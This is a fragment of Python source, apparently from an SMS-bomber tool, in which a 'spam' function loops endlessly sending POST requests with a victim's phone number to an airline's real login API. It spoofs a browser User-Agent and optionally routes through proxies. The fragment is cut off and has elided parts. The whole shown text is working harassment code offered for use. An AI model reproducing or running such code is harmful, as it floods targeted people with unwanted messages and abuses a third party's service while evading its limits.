    ...
    def main(self):
        ...
        def spam(thread_name='0', proxy=None):
            ...
            while True:
                try:
                    if proxy == None:
                        r = requests.post('https://b.utair.ru/api/v1/login/', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0'})
                    else:
                        r = requests.post('https://b.utair.ru/api/v1/login/', data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0'}, proxies={'http': str(proxy), 'https': str(proxy)})
